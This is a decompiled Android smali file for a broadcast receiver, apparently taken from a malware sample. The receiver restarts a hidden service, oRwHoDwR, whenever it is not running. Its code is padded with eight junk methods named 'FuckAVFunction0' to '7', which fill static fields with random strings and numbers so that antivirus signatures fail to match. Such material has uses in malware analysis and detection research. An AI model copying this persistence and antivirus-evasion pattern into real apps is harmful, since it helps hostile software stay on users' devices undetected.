.class public Lcom/androiddg/pgroute/SECCrr;
.super Landroid/content/BroadcastReceiver;
.source "SECCrr.java"


# static fields
.field public static final ACTION:Ljava/lang/String; = "com.androiddg.pgroute.MainServiceStart"

.field private static p0:Ljava/lang/String;

.field private static p1:Ljava/lang/Integer;

.field private static p10:Ljava/lang/String;

.field private static p11:Ljava/lang/Boolean;

.field private static p12:Ljava/lang/Integer;

.field private static p13:Ljava/lang/Integer;

.field private static p14:Ljava/lang/String;

.field private static p15:Ljava/lang/String;

.field private static p16:Ljava/lang/String;

.field private static p17:Ljava/lang/Integer;

.field private static p2:Ljava/lang/String;

.field private static p3:Ljava/lang/Boolean;

.field private static p4:Ljava/lang/Boolean;

.field private static p5:Ljava/lang/String;

.field private static p6:Ljava/lang/Boolean;

.field private static p7:Ljava/lang/String;

.field private static p8:Ljava/lang/String;

.field private static p9:Ljava/lang/Integer;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 7
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private static FuckAVFunction0(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)V
    .locals 7
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Boolean;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/Integer;
    .param p6, "v6"    # Ljava/lang/String;

    .prologue
    .line 33
    move-object v3, p3

    .line 34
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androiddg/pgroute/SECCrr;->p6:Ljava/lang/Boolean;

    .line 35
    move-object v5, p5

    .line 36
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androiddg/pgroute/SECCrr;->p13:Ljava/lang/Integer;

    .line 37
    move-object v0, p0

    .line 38
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androiddg/pgroute/SECCrr;->p1:Ljava/lang/Integer;

    .line 39
    move-object v6, p6

    .line 40
    .local v6, "s6":Ljava/lang/String;
    sput-object v6, Lcom/androiddg/pgroute/SECCrr;->p2:Ljava/lang/String;

    .line 41
    move-object v4, p4

    .line 42
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/SECCrr;->p8:Ljava/lang/String;

    .line 43
    move-object v1, p1

    .line 44
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/SECCrr;->p14:Ljava/lang/String;

    .line 45
    move-object v2, p2

    .line 46
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/SECCrr;->p15:Ljava/lang/String;

    .line 48
    return-void
.end method

.method private static FuckAVFunction1(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 6
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/Integer;

    .prologue
    .line 50
    move-object v3, p3

    .line 51
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androiddg/pgroute/SECCrr;->p13:Ljava/lang/Integer;

    .line 52
    move-object v4, p4

    .line 53
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/SECCrr;->p2:Ljava/lang/String;

    .line 54
    move-object v0, p0

    .line 55
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/SECCrr;->p16:Ljava/lang/String;

    .line 56
    move-object v2, p2

    .line 57
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/SECCrr;->p10:Ljava/lang/String;

    .line 58
    move-object v1, p1

    .line 59
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androiddg/pgroute/SECCrr;->p17:Ljava/lang/Integer;

    .line 60
    move-object v5, p5

    .line 61
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androiddg/pgroute/SECCrr;->p9:Ljava/lang/Integer;

    .line 62
    return-object v5
.end method

.method private static FuckAVFunction2(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/Integer;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Boolean;
    .param p5, "v5"    # Ljava/lang/String;
    .param p6, "v6"    # Ljava/lang/String;

    .prologue
    .line 65
    move-object v2, p2

    .line 66
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androiddg/pgroute/SECCrr;->p1:Ljava/lang/Integer;

    .line 67
    move-object v4, p4

    .line 68
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androiddg/pgroute/SECCrr;->p3:Ljava/lang/Boolean;

    .line 69
    move-object v6, p6

    .line 70
    .local v6, "s6":Ljava/lang/String;
    sput-object v6, Lcom/androiddg/pgroute/SECCrr;->p10:Ljava/lang/String;

    .line 71
    move-object v1, p1

    .line 72
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androiddg/pgroute/SECCrr;->p12:Ljava/lang/Integer;

    .line 73
    move-object v3, p3

    .line 74
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/SECCrr;->p16:Ljava/lang/String;

    .line 75
    move-object v5, p5

    .line 76
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androiddg/pgroute/SECCrr;->p0:Ljava/lang/String;

    .line 77
    move-object v0, p0

    .line 78
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/SECCrr;->p5:Ljava/lang/String;

    .line 79
    return-object v6
.end method

.method private static FuckAVFunction3(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)V
    .locals 7
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Boolean;
    .param p4, "v4"    # Ljava/lang/Boolean;
    .param p5, "v5"    # Ljava/lang/String;
    .param p6, "v6"    # Ljava/lang/String;

    .prologue
    .line 82
    move-object v2, p2

    .line 83
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/SECCrr;->p2:Ljava/lang/String;

    .line 84
    move-object v3, p3

    .line 85
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androiddg/pgroute/SECCrr;->p11:Ljava/lang/Boolean;

    .line 86
    move-object v0, p0

    .line 87
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/SECCrr;->p16:Ljava/lang/String;

    .line 88
    move-object v1, p1

    .line 89
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androiddg/pgroute/SECCrr;->p1:Ljava/lang/Integer;

    .line 90
    move-object v6, p6

    .line 91
    .local v6, "s6":Ljava/lang/String;
    sput-object v6, Lcom/androiddg/pgroute/SECCrr;->p8:Ljava/lang/String;

    .line 92
    move-object v4, p4

    .line 93
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androiddg/pgroute/SECCrr;->p3:Ljava/lang/Boolean;

    .line 94
    move-object v5, p5

    .line 95
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androiddg/pgroute/SECCrr;->p14:Ljava/lang/String;

    .line 97
    return-void
.end method

.method private static FuckAVFunction4(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 5
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/String;

    .prologue
    .line 99
    move-object v3, p3

    .line 100
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/SECCrr;->p15:Ljava/lang/String;

    .line 101
    move-object v2, p2

    .line 102
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/SECCrr;->p14:Ljava/lang/String;

    .line 103
    move-object v1, p1

    .line 104
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/SECCrr;->p7:Ljava/lang/String;

    .line 105
    move-object v0, p0

    .line 106
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androiddg/pgroute/SECCrr;->p12:Ljava/lang/Integer;

    .line 107
    move-object v4, p4

    .line 108
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/SECCrr;->p10:Ljava/lang/String;

    .line 109
    return-object v4
.end method

.method private static FuckAVFunction5(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;)V
    .locals 3
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/String;

    .prologue
    .line 112
    move-object v0, p0

    .line 113
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androiddg/pgroute/SECCrr;->p4:Ljava/lang/Boolean;

    .line 114
    move-object v2, p2

    .line 115
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/SECCrr;->p8:Ljava/lang/String;

    .line 116
    move-object v1, p1

    .line 117
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androiddg/pgroute/SECCrr;->p11:Ljava/lang/Boolean;

    .line 119
    return-void
.end method

.method private static FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 3
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Integer;

    .prologue
    .line 121
    move-object v0, p0

    .line 122
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androiddg/pgroute/SECCrr;->p6:Ljava/lang/Boolean;

    .line 123
    move-object v1, p1

    .line 124
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androiddg/pgroute/SECCrr;->p11:Ljava/lang/Boolean;

    .line 125
    move-object v2, p2

    .line 126
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androiddg/pgroute/SECCrr;->p12:Ljava/lang/Integer;

    .line 127
    return-object v2
.end method

.method private static FuckAVFunction7(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;
    .locals 5
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/String;

    .prologue
    .line 130
    move-object v3, p3

    .line 131
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androiddg/pgroute/SECCrr;->p17:Ljava/lang/Integer;

    .line 132
    move-object v2, p2

    .line 133
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/SECCrr;->p14:Ljava/lang/String;

    .line 134
    move-object v4, p4

    .line 135
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/SECCrr;->p5:Ljava/lang/String;

    .line 136
    move-object v1, p1

    .line 137
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androiddg/pgroute/SECCrr;->p9:Ljava/lang/Integer;

    .line 138
    move-object v0, p0

    .line 139
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androiddg/pgroute/SECCrr;->p12:Ljava/lang/Integer;

    .line 140
    return-object v4
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 10
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v9, 0x0

    const/4 v8, 0x1

    .line 145
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2f62f935

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 146
    const v0, 0x3356d867

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0xf965d3f

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "UhflhhSUW"

    const v3, 0x1c3d78c6

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "EUbvf"

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction7(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 147
    const v0, 0x256a3e6a

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "QEKQKApU"

    const-string v2, "RVwPua"

    const-string v3, "WdpGtEO"

    const-string v4, "oaPcLiT"

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction4(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 148
    sget-boolean v0, Lcom/androiddg/pgroute/oRwHoDwR;->isRunning:Z

    if-nez v0, :cond_0

    .line 149
    const-string v0, "cqPiic"

    const v1, 0x15134013

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "aBDDgoBigN"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "ptQGdKW"

    const-string v6, "DoDmFqHew"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction3(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)V

    .line 150
    const v0, 0x298bc001

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "JieLmuqm"

    const-string v2, "bQvQvQQln"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "lrKdCObv"

    const v5, 0x29642b51

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "vvrCUU"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction0(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)V

    .line 151
    new-instance v7, Landroid/content/Intent;

    const-string v0, "com.androiddg.pgroute.MainServiceStart"

    invoke-direct {v7, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 152
    .local v7, "i":Landroid/content/Intent;
    const-string v0, "igFTLRa"

    const v1, 0xf7bd262

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const v2, 0x2932cf42

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "tQClCflQ"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "rjMElGSp"

    const-string v6, "FskFaLT"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 153
    const-string v0, "GvQOdK"

    const v1, 0x11cc9a4b

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "jrdtWM"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "oFgHsFR"

    const-string v6, "ArKUUvb"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction3(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)V

    .line 154
    const v0, 0x344e1be7

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "tQIQCf"

    const-string v2, "iVTuiqmDm"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "gkHRuV"

    const v5, 0x27a607c

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "PNJLmLJ"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction0(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)V

    .line 155
    const-class v0, Lcom/androiddg/pgroute/oRwHoDwR;

    invoke-virtual {v7, p1, v0}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 156
    const-string v0, "kuiPwiP"

    const v1, 0x22749ed7

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "eLVqVcgN"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "OGEEjC"

    const-string v6, "mkueao"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction3(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)V

    .line 157
    const v0, 0x34a0f4c

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "gDcwVDq"

    const-string v2, "fSSWl"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "dEMUlvE"

    const v5, 0x4ab7e3e

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "rhWOIEQ"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction0(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)V

    .line 158
    const-string v0, "gisRuwVm"

    const v1, 0x1d9b2e0e

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "qLqDcHckg"

    const v3, 0x31728ffb

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "mskkFoRJoT"

    const v5, 0x2d2117f5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction1(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 159
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x279e947

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 160
    invoke-virtual {p1, v7}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 161
    const v0, 0x117c8280

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x106b2b58

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "oNgemL"

    const v3, 0xf0ded46

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "BNccue"

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction7(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 162
    const v0, 0x17ca028f

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "uuNeaL"

    const-string v2, "IMMlb"

    const-string v3, "oHagDu"

    const-string v4, "dWfbEOMAI"

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androiddg/pgroute/SECCrr;->FuckAVFunction4(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 164
    .end local v7    # "i":Landroid/content/Intent;
    :cond_0
    return-void
.end method
